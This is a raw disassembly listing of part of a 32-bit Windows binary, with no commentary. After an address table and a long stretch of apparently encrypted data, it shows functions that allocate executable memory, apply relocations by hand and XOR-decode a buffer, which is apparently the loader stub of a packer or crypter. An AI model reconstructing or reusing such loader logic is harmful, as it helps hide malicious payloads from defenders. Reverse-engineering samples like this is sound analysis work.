  454297:	add    BYTE PTR [eax+ebp*2+0x68c00045],bh
  45429e:	inc    ebp
  45429f:	add    ah,al
  4542a1:	push   0x68c80045
  4542a6:	inc    ebp
  4542a7:	add    ah,cl
  4542a9:	push   0x68d00045
  4542ae:	inc    ebp
  4542af:	add    ah,dl
  4542b1:	push   0x68d80045
  4542b6:	inc    ebp
  4542b7:	add    ah,bl
  4542b9:	push   0x68e00045
  4542be:	inc    ebp
  4542bf:	add    ah,ah
  4542c1:	push   0x68e80045
  4542c6:	inc    ebp
  4542c7:	add    ah,ch
  4542c9:	push   0x68f00045
  4542ce:	inc    ebp
  4542cf:	add    ah,dh
  4542d1:	push   0x68f80045
  4542d6:	inc    ebp
  4542d7:	add    ah,bh
  4542d9:	push   0x69000045
  4542de:	inc    ebp
  4542df:	add    al,bl
  4542e1:	push   0x69040045
  4542e6:	inc    ebp
  4542e7:	add    ah,ch
  4542e9:	push   0x69080045
  4542ee:	inc    ebp
  4542ef:	add    BYTE PTR [eax+0xc004568],ah
  4542f5:	imul   eax,DWORD PTR [ebp+0x0],0x456910
  4542fc:	adc    al,0x69
  4542fe:	inc    ebp
  4542ff:	add    BYTE PTR [eax],bl
  454301:	imul   eax,DWORD PTR [ebp+0x0],0x45691c
  454308:	and    BYTE PTR [ecx+0x45],ch
  45430b:	add    BYTE PTR [ecx+ebp*2],ah
  45430e:	inc    ebp
  45430f:	add    ah,bl
  454311:	push   0x69280045
  454316:	inc    ebp
  454317:	add    BYTE PTR [ecx+ebp*2],ch
  45431a:	inc    ebp
  45431b:	add    BYTE PTR [eax],dh
  45431d:	imul   eax,DWORD PTR [ebp+0x0],0x456934
  454324:	cmp    BYTE PTR [ecx+0x45],ch
  454327:	add    BYTE PTR [ecx+ebp*2],bh
  45432a:	inc    ebp
  45432b:	add    BYTE PTR [eax+0x69],al
  45432e:	inc    ebp
  45432f:	add    BYTE PTR [ecx+ebp*2+0x45],al
  454333:	add    BYTE PTR [eax+0x69],cl
  454336:	inc    ebp
  454337:	add    BYTE PTR [ecx+ebp*2+0x45],cl
  45433b:	add    ah,dl
  45433d:	push   0x69500045
  454342:	inc    ebp
  454343:	add    BYTE PTR [ecx+ebp*2+0x45],dl
  454347:	add    BYTE PTR [eax+0x69],bl
  45434a:	inc    ebp
  45434b:	add    al,ah
  45434d:	addr16 inc ebp
  45434f:	add    BYTE PTR [ecx+ebp*2+0x45],bl
  454353:	add    BYTE PTR [eax+0x68],bh
  454356:	inc    ebp
  454357:	add    BYTE PTR [eax+ebp*2+0x45],bh
  45435b:	add    BYTE PTR [eax+0x69],ah
  45435e:	inc    ebp
  45435f:	add    BYTE PTR [ecx+ebp*2+0x45],ah
  454363:	add    BYTE PTR [eax],bl
  454365:	imul   eax,DWORD PTR [ebp+0x0],0x456968
  45436c:	ins    BYTE PTR es:[edi],dx
  45436d:	imul   eax,DWORD PTR [ebp+0x0],0x456970
  454374:	je     0x4543df
  454376:	inc    ebp
  454377:	add    BYTE PTR [eax+0x69],bh
  45437a:	inc    ebp
  45437b:	add    BYTE PTR [ecx+ebp*2+0x45],dl
  45437f:	add    BYTE PTR [ecx+ebp*2+0x45],bh
  454383:	add    BYTE PTR [eax-0x7bffba97],al
  454389:	imul   eax,DWORD PTR [ebp+0x0],0x456988
  454390:	cmp    al,0x69
  454392:	inc    ebp
  454393:	add    BYTE PTR [ecx+ebp*2+0x69900045],cl
  45439a:	inc    ebp
  45439b:	add    BYTE PTR [ecx+ebp*2+0x69980045],dl
  4543a2:	inc    ebp
  4543a3:	add    BYTE PTR [ecx+ebp*2+0x69a00045],bl
  4543aa:	inc    ebp
  4543ab:	add    BYTE PTR [ecx+ebp*2+0x69a80045],ah
  4543b2:	inc    ebp
  4543b3:	add    BYTE PTR [ecx+ebp*2+0x69380045],ch
  4543ba:	inc    ebp
  4543bb:	add    BYTE PTR [eax-0x4bffba97],dh
  4543c1:	imul   eax,DWORD PTR [ebp+0x0],0x4569b8
  4543c8:	mov    esp,0xc0004569
  4543cd:	imul   eax,DWORD PTR [ebp+0x0],0x4569c4
  4543d4:	enter  0x4569,0x0
  4543d8:	int3   
  4543d9:	imul   eax,DWORD PTR [ebp+0x0],0x4569d0
  4543e0:	aam    0x69
  4543e2:	inc    ebp
  4543e3:	add    BYTE PTR [eax-0x27ffba98],ah
  4543e9:	imul   eax,DWORD PTR [ebp+0x0],0x4569dc
  4543f0:	loopne 0x45445b
  4543f2:	inc    ebp
  4543f3:	add    ah,ah
  4543f5:	imul   eax,DWORD PTR [ebp+0x0],0x4569e8
  4543fc:	in     al,dx
  4543fd:	imul   eax,DWORD PTR [ebp+0x0],0x4569f0
  454404:	hlt    
  454405:	imul   eax,DWORD PTR [ebp+0x0],0x4568e8
  45440c:	clc    
  45440d:	imul   eax,DWORD PTR [ebp+0x0],0x4569fc
  454414:	add    BYTE PTR [edx+0x45],ch
  454417:	add    BYTE PTR [edx+ebp*2],al
  45441a:	inc    ebp
  45441b:	add    BYTE PTR [eax],cl
  45441d:	push   0x45
  45441f:	add    BYTE PTR [ecx+ebp*2+0x45],bl
  454423:	add    BYTE PTR [edx+ebp*2],cl
  454426:	inc    ebp
  454427:	add    BYTE PTR [eax],cl
  454429:	imul   eax,DWORD PTR [ebp+0x0],0x456a10
  454430:	jo     0x45449a
  454432:	inc    ebp
  454433:	add    ah,dl
  454435:	imul   eax,DWORD PTR [ebp+0x0],0x456a14
  45443c:	sbb    BYTE PTR [edx+0x45],ch
  45443f:	add    BYTE PTR [edx+ebp*2],bl
  454442:	inc    ebp
  454443:	add    al,bh
  454445:	addr16 inc ebp
  454447:	add    BYTE PTR [eax],ah
  454449:	push   0x45
  45444b:	add    BYTE PTR [edx+ebp*2],ah
  45444e:	inc    ebp
  45444f:	add    BYTE PTR [eax],ch
  454451:	push   0x45
  454453:	add    BYTE PTR [eax+ebp*2+0x45],cl
  454457:	add    BYTE PTR [edx+ebp*2],ch
  45445a:	inc    ebp
  45445b:	add    BYTE PTR [eax],dh
  45445d:	push   0x45
  45445f:	add    BYTE PTR [edx+ebp*2],dh
  454462:	inc    ebp
  454463:	add    BYTE PTR [eax],bh
  454465:	push   0x45
  454467:	add    BYTE PTR [edx+ebp*2],bh
  45446a:	inc    ebp
  45446b:	add    al,dh
  45446d:	addr16 inc ebp
  45446f:	add    BYTE PTR [eax+0x6a],al
  454472:	inc    ebp
  454473:	add    BYTE PTR [edx+ebp*2+0x45],al
  454477:	add    BYTE PTR [eax+0x6a],cl
  45447a:	inc    ebp
  45447b:	add    BYTE PTR [edx+ebp*2+0x45],cl
  45447f:	add    BYTE PTR [eax+0x6a],dl
  454482:	inc    ebp
  454483:	add    BYTE PTR [edx+ebp*2+0x45],dl
  454487:	add    BYTE PTR [eax+0x6a],bl
  45448a:	inc    ebp
  45448b:	add    BYTE PTR [edx+ebp*2+0x45],bl
  45448f:	add    BYTE PTR [eax+0x6a],ah
  454492:	inc    ebp
  454493:	add    BYTE PTR [edx+ebp*2+0x45],ah
  454497:	add    BYTE PTR [eax+0x6a],ch
  45449a:	inc    ebp
  45449b:	add    BYTE PTR [edx+ebp*2+0x45],ch
  45449f:	add    BYTE PTR [eax+0x6a],dh
  4544a2:	inc    ebp
  4544a3:	add    BYTE PTR [edx+ebp*2+0x45],dh
  4544a7:	add    ah,ah
  4544a9:	addr16 inc ebp
  4544ab:	add    BYTE PTR [eax+0x6a],bh
  4544ae:	inc    ebp
  4544af:	add    BYTE PTR [edx+ebp*2+0x45],bh
  4544b3:	add    al,ch
  4544b5:	push   0x6a800045
  4544ba:	inc    ebp
  4544bb:	add    BYTE PTR [edx+ebp*2+0x6a3c0045],al
  4544c2:	inc    ebp
  4544c3:	add    BYTE PTR [eax-0x73ffba96],cl
  4544c9:	push   0x45
  4544cb:	add    BYTE PTR [eax-0x17ffba96],dl
  4544d1:	imul   eax,DWORD PTR [ebp+0x0],0x456a94
  4544d8:	cwde   
  4544d9:	push   0x45
  4544db:	add    BYTE PTR [edx+ebp*2+0x6aa00045],bl
  4544e2:	inc    ebp
  4544e3:	add    BYTE PTR [edx+ebp*2+0x695c0045],cl
  4544ea:	inc    ebp
  4544eb:	add    BYTE PTR [edx+ebp*2+0x6aa80045],ah
  4544f2:	inc    ebp
  4544f3:	add    BYTE PTR [edx+ebp*2+0x6ab00045],ch
  4544fa:	inc    ebp
  4544fb:	add    al,al
  4544fd:	push   0x68380045
  454502:	inc    ebp
  454503:	add    BYTE PTR [edx+ebp*2+0x6ab80045],dh
  45450a:	inc    ebp
  45450b:	add    BYTE PTR [edx+ebp*2+0x68640045],bh
  454512:	inc    ebp
  454513:	add    al,al
  454515:	push   0x45
  454517:	add    ah,al
  454519:	push   0x45
  45451b:	add    BYTE PTR [eax+ebp*2+0x6ac80045],ah
  454522:	inc    ebp
  454523:	add    ah,cl
  454525:	push   0x45
  454527:	add    al,dl
  454529:	push   0x45
  45452b:	add    BYTE PTR [eax],bh
  45452d:	push   0x6ad40045
  454532:	inc    ebp
  454533:	add    BYTE PTR [eax-0x27ffba98],bl
  454539:	push   0x45
  45453b:	add    ah,bl
  45453d:	push   0x45
  45453f:	add    al,ah
  454541:	push   0x45
  454543:	add    ah,ah
  454545:	push   0x45
  454547:	add    al,ch
  454549:	push   0x45
  45454b:	add    ah,ch
  45454d:	push   0x45
  45454f:	add    ah,dl
  454551:	addr16 inc ebp
  454553:	add    ah,al
  454555:	push   0x45
  454557:	add    BYTE PTR [ecx+ebp*2],bh
  45455a:	inc    ebp
  45455b:	add    al,dh
  45455d:	push   0x45
  45455f:	add    ah,dh
  454561:	push   0x45
  454563:	add    al,bh
  454565:	push   0x45
  454567:	add    ah,bh
  454569:	push   0x45
  45456b:	add    BYTE PTR [eax],al
  45456d:	imul   eax,DWORD PTR [ebp+0x0],0x4
  454571:	imul   eax,DWORD PTR [ebp+0x0],0x8
  454575:	imul   eax,DWORD PTR [ebp+0x0],0xc
  454579:	imul   eax,DWORD PTR [ebp+0x0],0xffffffd0
  45457d:	addr16 inc ebp
  45457f:	add    BYTE PTR [eax],dl
  454581:	imul   eax,DWORD PTR [ebp+0x0],0x14
  454585:	imul   eax,DWORD PTR [ebp+0x0],0x18
  454589:	imul   eax,DWORD PTR [ebp+0x0],0xffffffa4
  45458d:	push   0x45
  45458f:	add    BYTE PTR [ebx+ebp*2],bl
  454592:	inc    ebp
  454593:	add    ah,ah
  454595:	addr16 inc ebp
  454597:	add    BYTE PTR [eax],ah
  454599:	imul   eax,DWORD PTR [ebp+0x0],0xffffff8c
  45459d:	push   0x695c0045
  4545a2:	inc    ebp
  4545a3:	add    BYTE PTR [ebx+ebp*2],ah
  4545a6:	inc    ebp
  4545a7:	add    BYTE PTR [eax],ch
  4545a9:	imul   eax,DWORD PTR [ebp+0x0],0x2c
  4545ad:	imul   eax,DWORD PTR [ebp+0x0],0x30
  4545b1:	imul   eax,DWORD PTR [ebp+0x0],0x34
  4545b5:	imul   eax,DWORD PTR [ebp+0x0],0x38
  4545b9:	imul   eax,DWORD PTR [ebp+0x0],0x8
  4545bd:	push   0x6b3c0045
  4545c2:	inc    ebp
  4545c3:	add    BYTE PTR [eax+0x6b],al
  4545c6:	inc    ebp
  4545c7:	add    BYTE PTR [ebx+ebp*2+0x45],al
  4545cb:	add    BYTE PTR [eax+0x6b],cl
  4545ce:	inc    ebp
  4545cf:	add    BYTE PTR [ebx+ebp*2+0x45],cl
  4545d3:	add    BYTE PTR [eax+0x6b],dl
  4545d6:	inc    ebp
  4545d7:	add    BYTE PTR [ebx+ebp*2+0x45],dl
  4545db:	add    BYTE PTR [eax+ebp*2],ch
  4545de:	inc    ebp
  4545df:	add    BYTE PTR [eax+0x6b],bl
  4545e2:	inc    ebp
  4545e3:	add    BYTE PTR [ebx+ebp*2+0x45],bl
  4545e7:	add    BYTE PTR [eax+0x6b],ah
  4545ea:	inc    ebp
  4545eb:	add    BYTE PTR [ecx+ebp*2+0x45],dh
  4545ef:	add    BYTE PTR [ebx+ebp*2+0x45],ah
  4545f3:	add    BYTE PTR [eax+0x6b],ch
  4545f6:	inc    ebp
  4545f7:	add    BYTE PTR [eax+0x68],al
  4545fa:	inc    ebp
  4545fb:	add    BYTE PTR [ebx+ebp*2+0x45],ch
  4545ff:	add    BYTE PTR [eax],bl
  454601:	imul   eax,DWORD PTR [ebp+0x0],0x456b70
  454608:	je     0x454675
  45460a:	inc    ebp
  45460b:	add    BYTE PTR [eax+0x6b],bh
  45460e:	inc    ebp
  45460f:	add    BYTE PTR [ebx+ebp*2+0x45],bh
  454613:	add    BYTE PTR [eax-0x7bffba95],al
  454619:	imul   eax,DWORD PTR [ebp+0x0],0x58
  45461d:	push   0x6b880045
  454622:	inc    ebp
  454623:	add    BYTE PTR [edx+ebp*2+0x6b8c0045],al
  45462a:	inc    ebp
  45462b:	add    BYTE PTR [eax-0x27ffba95],dl
  454631:	addr16 inc ebp
  454633:	add    BYTE PTR [ebx+ebp*2+0x6a040045],dl
  45463a:	inc    ebp
  45463b:	add    BYTE PTR [eax-0x63ffba95],bl
  454641:	imul   eax,DWORD PTR [ebp+0x0],0x3c
  454645:	imul   eax,DWORD PTR [ebp+0x0],0x456b70
  45464c:	mov    al,ds:0xa400456b
  454651:	imul   eax,DWORD PTR [ebp+0x0],0xffffffa0
  454655:	ins    DWORD PTR es:[edi],dx
  454656:	outs   dx,DWORD PTR ds:[esi]
  454657:	(bad)  
  454658:	test   edi,0xa5b50934
  45465e:	lds    edx,FWORD PTR [ebx]
  454660:	inc    ebp
  454661:	sbb    al,0xf8
  454663:	add    BYTE PTR [eax+0x76],bl
  454666:	mov    ah,0x9e
  454668:	sbb    eax,0x7f480719
  45466d:	pop    esi
  45466e:	sub    al,0xd9
  454670:	xchg   edx,eax
  454671:	jmp    0x3c09e546
  454676:	sbb    cl,al
  454678:	mov    DWORD PTR [edx+0x63],ecx
  45467b:	sbb    edi,DWORD PTR [edx+0x746d3d9f]
  454681:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  454682:	inc    ebp
  454683:	fsub   st,st(4)
  454685:	jmp    0x1ed8:0x2c9af40e
  45468c:	pop    ds
  45468d:	repz cmp edi,DWORD PTR [eax+eiz*8-0x2cd20d28]
  454695:	pop    esi
  454696:	sar    BYTE PTR [edi-0xb],cl
  454699:	outs   dx,DWORD PTR ds:[esi]
  45469a:	retf   
  45469b:	inc    ebp
  45469c:	xchg   ecx,eax
  45469d:	mov    edi,0x174193d9
  4546a2:	imul   esp,DWORD PTR [eax+0x45],0x21
  4546a6:	shl    DWORD PTR [edi+0x57],0xda
  4546aa:	into   
  4546ab:	sbb    al,0x6c
  4546ad:	rcr    BYTE PTR ds:0x4b6f4b0b,1
  4546b3:	cmp    dh,BYTE PTR [ebp+0x6c]
  4546b6:	sbb    eax,DWORD PTR [ebx-0x24]
  4546b9:	jecxz  0x4546b6
  4546bb:	addr16 invd 
  4546be:	lea    ebx,[ebp+0x1d]
  4546c1:	xor    eax,0x17bf083e
  4546c6:	lahf   
  4546c7:	push   edi
  4546c8:	jae    0x45466b
  4546ca:	call   0xf53:0x95ffc47
  4546d1:	jno    0x4546f8
  4546d3:	mov    esi,0x18a16626
  4546d8:	and    DWORD PTR [ebx+edx*8],edi
  4546db:	mov    ds:0x64c16a71,eax
  4546e0:	das    
  4546e1:	test   DWORD PTR [esp+edi*8-0xe9d4b4d],eax
  4546e8:	fwait
  4546e9:	push   ds
  4546ea:	inc    esi
  4546eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4546ec:	pop    ds
  4546ed:	and    DWORD PTR [ebp-0x16],edi
  4546f0:	add    eax,0xfe75c24a
  4546f5:	dec    esp
  4546f6:	inc    ebx
  4546f7:	add    bl,ah
  4546f9:	imul   ebx,DWORD PTR [edx+0x1d98a875],0x3f0c3e6b
  454703:	loopne 0x45476e
  454705:	dec    ebp
  454706:	aas    
  454707:	imul   ebp,DWORD PTR [edx+0x7a],0x8afac5b2
  45470e:	cwde   
  45470f:	fimul  WORD PTR ds:0x344284aa
  454715:	pop    es
  454716:	pop    edi
  454717:	scas   eax,DWORD PTR es:[edi]
  454718:	or     al,bl
  45471a:	mov    cl,0xa6
  45471c:	mov    cl,0x47
  45471e:	jbe    0x4546bb
  454720:	add    bh,dl
  454722:	ins    BYTE PTR es:[edi],dx
  454723:	mov    esi,0xf808df08
  454728:	jmp    0x251d:0x3457f6ab
  45472f:	and    BYTE PTR [ecx+0x7b7eac4f],dh
  454735:	mov    ch,0x5e
  454737:	mov    ch,0x87
  454739:	aas    
  45473a:	jl     0x454728
  45473c:	mov    edi,0x632c3767
  454741:	outs   dx,BYTE PTR ds:[esi]
  454742:	push   esp
  454743:	jno    0x454770
  454745:	mov    al,0x90
  454747:	ins    BYTE PTR es:[edi],dx
  454748:	ss push ebp
  45474a:	pop    esi
  45474b:	sahf   
  45474c:	xor    BYTE PTR [bp-0x4a],ah
  454750:	(bad)  
  454752:	sbb    DWORD PTR [eax+0xd],eax
  454755:	fs scas eax,DWORD PTR es:[edi]
  454757:	pop    ebx
  454758:	add    BYTE PTR [ecx],0x72
  45475b:	fwait
  45475c:	pop    es
  45475d:	dec    ebp
  45475e:	xor    al,0x1f
  454760:	push   eax
  454761:	xor    eax,0xe31755a0
  454766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  454767:	mov    bh,0xd6
  454769:	push   es
  45476a:	fidiv  WORD PTR [eax+0x6eb1e584]
  454770:	sar    BYTE PTR [eax+0x44a8625a],0x0
  454777:	xchg   BYTE PTR [ecx],ah
  454779:	adc    eax,0xb6a8c339
  45477e:	adc    BYTE PTR [esi],ch
  454780:	inc    esp
  454781:	loop   0x454776
  454783:	int3   
  454784:	push   es
  454785:	sbb    eax,0xcac6769a
  45478a:	pop    ebx
  45478b:	ret    
  45478c:	fucom  st(3)
  45478e:	mov    bh,0x57
  454790:	and    BYTE PTR [edi-0x5f],0x9b
  454794:	cmc    
  454795:	cdq    
  454796:	imul   esp,DWORD PTR [ecx+0x15],0xffffffac
  45479a:	add    ah,0x74
  45479d:	dec    ecx
  45479e:	push   ds
  45479f:	aas    
  4547a0:	mov    al,0xa2
  4547a2:	sahf   
  4547a3:	jecxz  0x454738
  4547a5:	in     eax,0x12
  4547a7:	push   esi
  4547a8:	push   esp
  4547a9:	jns    0x4547ec
  4547ab:	mov    al,0x89
  4547ad:	jle    0x45475e
  4547af:	xor    DWORD PTR [ebp+eax*2-0x137759c4],edx
  4547b6:	sub    ch,bh
  4547b8:	aas    
  4547b9:	xor    esi,esp
  4547bb:	xchg   esi,eax
  4547bc:	push   cs
  4547bd:	out    0x0,al
  4547bf:	mov    dl,0x3b
  4547c1:	cmp    bl,cl
  4547c3:	out    0x74,eax
  4547c5:	xor    DWORD PTR [edi],0x3923dbed
  4547cb:	xchg   edi,eax
  4547cc:	mov    ch,0xe
  4547ce:	dec    ecx
  4547cf:	mov    cl,0x93
  4547d1:	sub    al,0xb2
  4547d3:	or     BYTE PTR ss:[edx+0x4f],bl
  4547d7:	jnp    0x4547a6
  4547d9:	mov    esi,0xb448c8f2
  4547de:	pop    ds
  4547df:	push   0xffffff86
  4547e1:	jno    0x454857
  4547e3:	mov    cl,0x99
  4547e5:	out    0xc3,al
  4547e7:	dec    ecx
  4547e8:	(bad)  
  4547e9:	adc    DWORD PTR [ebx],0x74
  4547ec:	jno    0x454778
  4547ee:	or     bl,BYTE PTR [ebp+0x7ba045f5]
  4547f4:	mov    eax,ds:0x651db322
  4547f9:	mov    bh,0x9a
  4547fb:	mov    cs,WORD PTR [ebx-0x29]
  4547fe:	jae    0x454821
  454800:	fisttp WORD PTR ds:0x90b23e48
  454806:	lahf   
  454807:	and    DWORD PTR [edx+0x2e],edi
  45480a:	xchg   ebp,eax
  45480b:	jbe    0x45484d
  45480d:	fdiv   QWORD PTR [ebp+0x25]
  454810:	in     al,0x6c
  454812:	push   0x18
  454814:	out    dx,al
  454815:	stc    
  454816:	add    bh,BYTE PTR [ebp-0x5146898e]
  45481c:	popf   
  45481d:	fwait
  45481e:	(bad)  
  45481f:	lods   eax,DWORD PTR ds:[esi]
  454820:	nop
  454821:	add    esi,edx
  454823:	jl     0x454817
  454825:	mov    fs,esp
  454827:	fist   DWORD PTR [edx*4-0x6cd258ba]
  45482e:	pop    eax
  45482f:	push   eax
  454830:	push   edi
  454831:	mov    ecx,0x9ee90fc4
  454836:	mov    edi,edi
  454838:	cmp    DWORD PTR [ebx+0x2521eb0d],ebp
  45483e:	adc    DWORD PTR [ebp+0x5],edi
  454841:	inc    edx
  454842:	retf   0x1769
  454845:	sub    al,ah
  454847:	and    DWORD PTR [ebx-0x5c020410],ecx
  45484d:	fisubr WORD PTR cs:[ecx+ecx*1-0x46]
  454852:	pop    esp
  454853:	(bad)  
  454854:	int3   
  454855:	int3   
  454856:	int3   
  454857:	int3   
  454858:	int3   
  454859:	int3   
  45485a:	int3   
  45485b:	int3   
  45485c:	int3   
  45485d:	int3   
  45485e:	int3   
  45485f:	int3   
  454860:	push   ebp
  454861:	mov    ebp,esp
  454863:	sub    esp,0xc
  454866:	mov    DWORD PTR [ebp-0x8],0x1e4dc
  45486d:	mov    DWORD PTR [ebp-0xc],0x3000
  454874:	mov    DWORD PTR [ebp-0x4],0x40
  45487b:	mov    eax,DWORD PTR [ebp-0x4]
  45487e:	push   eax
  45487f:	mov    ecx,DWORD PTR [ebp-0xc]
  454882:	push   ecx
  454883:	mov    edx,DWORD PTR [ebp+0x8]
  454886:	push   edx
  454887:	push   0x0
  454889:	push   0xffffffff
  45488b:	call   DWORD PTR ds:0x4567b8
  454891:	mov    esp,ebp
  454893:	pop    ebp
  454894:	ret    
  454895:	int3   
  454896:	int3   
  454897:	int3   
  454898:	int3   
  454899:	int3   
  45489a:	int3   
  45489b:	int3   
  45489c:	int3   
  45489d:	int3   
  45489e:	int3   
  45489f:	int3   
  4548a0:	push   ebp
  4548a1:	mov    ebp,esp
  4548a3:	pop    ebp
  4548a4:	ret    
  4548a5:	int3   
  4548a6:	int3   
  4548a7:	int3   
  4548a8:	int3   
  4548a9:	int3   
  4548aa:	int3   
  4548ab:	int3   
  4548ac:	int3   
  4548ad:	int3   
  4548ae:	int3   
  4548af:	int3   
  4548b0:	push   ebp
  4548b1:	mov    ebp,esp
  4548b3:	sub    esp,0x8
  4548b6:	mov    eax,DWORD PTR [ebp+0x8]
  4548b9:	mov    DWORD PTR [ebp-0x4],eax
  4548bc:	mov    ecx,DWORD PTR [ebp+0xc]
  4548bf:	mov    DWORD PTR [ebp-0x8],ecx
  4548c2:	mov    edx,DWORD PTR [ebp-0x4]
  4548c5:	cmp    edx,DWORD PTR [ebp-0x8]
  4548c8:	jae    0x4548d1
  4548ca:	mov    eax,DWORD PTR [ebp-0x4]
  4548cd:	jmp    0x4548d4
  4548cf:	jmp    0x4548d4
  4548d1:	mov    eax,DWORD PTR [ebp-0x8]
  4548d4:	mov    esp,ebp
  4548d6:	pop    ebp
  4548d7:	ret    
  4548d8:	int3   
  4548d9:	int3   
  4548da:	int3   
  4548db:	int3   
  4548dc:	int3   
  4548dd:	int3   
  4548de:	int3   
  4548df:	int3   
  4548e0:	push   ebp
  4548e1:	mov    ebp,esp
  4548e3:	mov    DWORD PTR ds:0x458c64,0x401004
  4548ed:	pop    ebp
  4548ee:	ret    
  4548ef:	int3   
  4548f0:	push   ebp
  4548f1:	mov    ebp,esp
  4548f3:	mov    DWORD PTR ds:0x458c64,0x4538b8
  4548fd:	pop    ebp
  4548fe:	ret    
  4548ff:	int3   
  454900:	push   ebp
  454901:	mov    ebp,esp
  454903:	mov    eax,DWORD PTR [ebp+0x8]
  454906:	mov    eax,DWORD PTR [eax-0x4]
  454909:	pop    ebp
  45490a:	ret    
  45490b:	int3   
  45490c:	int3   
  45490d:	int3   
  45490e:	int3   
  45490f:	int3   
  454910:	push   ebp
  454911:	mov    ebp,esp
  454913:	sub    esp,0xc
  454916:	mov    DWORD PTR [ebp-0x4],0x0
  45491d:	jmp    0x454928
  45491f:	mov    eax,DWORD PTR [ebp-0x4]
  454922:	add    eax,0x1
  454925:	mov    DWORD PTR [ebp-0x4],eax
  454928:	mov    ecx,DWORD PTR [ebp-0x4]
  45492b:	cmp    ecx,DWORD PTR [ebp+0x8]
  45492e:	jae    0x45497f
  454930:	mov    edx,DWORD PTR [ebp-0x4]
  454933:	mov    eax,DWORD PTR [ebp+0xc]
  454936:	movzx  ecx,WORD PTR [eax+edx*2]
  45493a:	sar    ecx,0xc
  45493d:	cmp    ecx,0x3
  454940:	jne    0x45497d
  454942:	mov    DWORD PTR [ebp-0xc],0xfff
  454949:	mov    edx,DWORD PTR [ebp-0x4]
  45494c:	mov    eax,DWORD PTR [ebp+0xc]
  45494f:	movzx  ecx,WORD PTR [eax+edx*2]
  454953:	and    ecx,DWORD PTR [ebp-0xc]
  454956:	add    ecx,0x43
  454959:	mov    DWORD PTR [ebp-0x8],ecx
  45495c:	mov    edx,DWORD PTR [ebp+0x18]
  45495f:	mov    eax,DWORD PTR [ebp+0x10]
  454962:	add    eax,DWORD PTR [edx]
  454964:	mov    ecx,DWORD PTR [ebp-0x8]
  454967:	mov    edx,DWORD PTR [eax+ecx*1-0x43]
  45496b:	add    edx,DWORD PTR [ebp+0x14]
  45496e:	mov    eax,DWORD PTR [ebp+0x18]
  454971:	mov    ecx,DWORD PTR [ebp+0x10]
  454974:	add    ecx,DWORD PTR [eax]
  454976:	mov    eax,DWORD PTR [ebp-0x8]
  454979:	mov    DWORD PTR [ecx+eax*1-0x43],edx
  45497d:	jmp    0x45491f
  45497f:	mov    esp,ebp
  454981:	pop    ebp
  454982:	ret    
  454983:	int3   
  454984:	int3   
  454985:	int3   
  454986:	int3   
  454987:	int3   
  454988:	int3   
  454989:	int3   
  45498a:	int3   
  45498b:	int3   
  45498c:	int3   
  45498d:	int3   
  45498e:	int3   
  45498f:	int3   
  454990:	push   ebp
  454991:	mov    ebp,esp
  454993:	sub    esp,0x28
  454996:	mov    DWORD PTR [ebp-0x8],0x11cb
  45499d:	mov    DWORD PTR [ebp-0x10],0x0
  4549a4:	jmp    0x4549af
  4549a6:	mov    eax,DWORD PTR [ebp-0x10]
  4549a9:	add    eax,0x4
  4549ac:	mov    DWORD PTR [ebp-0x10],eax
  4549af:	mov    ecx,DWORD PTR [ebp-0x10]
  4549b2:	cmp    ecx,DWORD PTR [ebp+0xc]
  4549b5:	jae    0x454a84
  4549bb:	mov    DWORD PTR [ebp-0x8],0x11cb
  4549c2:	cmp    DWORD PTR [ebp-0x10],0x0
  4549c6:	jne    0x454a18
  4549c8:	push   0x104
  4549cd:	push   0x458c68
  4549d2:	call   DWORD PTR ds:0x4567bc
  4549d8:	push   0x456000
  4549dd:	push   0x458c68
  4549e2:	call   DWORD PTR ds:0x4567c0
  4549e8:	push   0x0
  4549ea:	push   0x80
  4549ef:	push   0x3
  4549f1:	push   0x0
  4549f3:	push   0x3
  4549f5:	push   0x1
  4549f7:	push   0x458c68
  4549fc:	call   DWORD PTR ds:0x4567c4
  454a02:	mov    DWORD PTR [ebp-0x4],eax
  454a05:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  454a09:	je     0x454a11
  454a0b:	cmp    DWORD PTR [ebp-0x4],0x0
  454a0f:	jne    0x454a18
  454a11:	mov    eax,0x42
  454a16:	jmp    0x454a84
  454a18:	mov    DWORD PTR [ebp-0x8],0x11cb
  454a1f:	mov    edx,DWORD PTR [ebp-0x10]
  454a22:	add    edx,0xd
  454a25:	mov    DWORD PTR ds:0x458d6c,edx
  454a2b:	mov    eax,DWORD PTR [ebp+0x8]
  454a2e:	add    eax,DWORD PTR [ebp-0x10]
  454a31:	mov    ecx,DWORD PTR [eax]
  454a33:	add    ecx,DWORD PTR [ebp-0x10]
  454a36:	mov    edx,DWORD PTR [ebp+0x8]
  454a39:	add    edx,DWORD PTR [ebp-0x10]
  454a3c:	mov    DWORD PTR [edx],ecx
  454a3e:	mov    eax,DWORD PTR [ebp-0xc]
  454a41:	mov    DWORD PTR [ebp-0x14],eax
  454a44:	mov    DWORD PTR [ebp-0x8],0x11cb
  454a4b:	mov    ecx,DWORD PTR ds:0x458d6c
  454a51:	mov    DWORD PTR [ebp-0x24],ecx
  454a54:	mov    edx,DWORD PTR [ebp-0x24]
  454a57:	mov    DWORD PTR [ebp-0x20],edx
  454a5a:	mov    eax,DWORD PTR [ebp-0x20]
  454a5d:	mov    DWORD PTR [ebp-0x1c],eax
  454a60:	mov    ecx,DWORD PTR [ebp-0x1c]
  454a63:	mov    DWORD PTR [ebp-0x18],ecx
  454a66:	mov    edx,DWORD PTR [ebp-0x18]
  454a69:	mov    DWORD PTR [ebp-0x28],edx
  454a6c:	mov    eax,DWORD PTR [ebp+0x8]
  454a6f:	add    eax,DWORD PTR [ebp-0x10]
  454a72:	mov    ecx,DWORD PTR [eax]
  454a74:	xor    ecx,DWORD PTR [ebp-0x18]
  454a77:	mov    edx,DWORD PTR [ebp+0x8]
  454a7a:	add    edx,DWORD PTR [ebp-0x10]
  454a7d:	mov    DWORD PTR [edx],ecx
  454a7f:	jmp    0x4549a6
  454a84:	mov    esp,ebp
  454a86:	pop    ebp
  454a87:	ret    
  454a88:	int3   
  454a89:	int3   
  454a8a:	int3   
  454a8b:	int3   
  454a8c:	int3   
  454a8d:	int3   
  454a8e:	int3   
  454a8f:	int3   
  454a90:	push   ebp
  454a91:	mov    ebp,esp
  454a93:	sub    esp,0x14
  454a96:	mov    eax,DWORD PTR [ebp+0x8]
  454a99:	cmp    DWORD PTR [eax+0x4],0x0
  454a9d:	je     0x454ae7
  454a9f:	mov    DWORD PTR [ebp-0x14],0x2a1
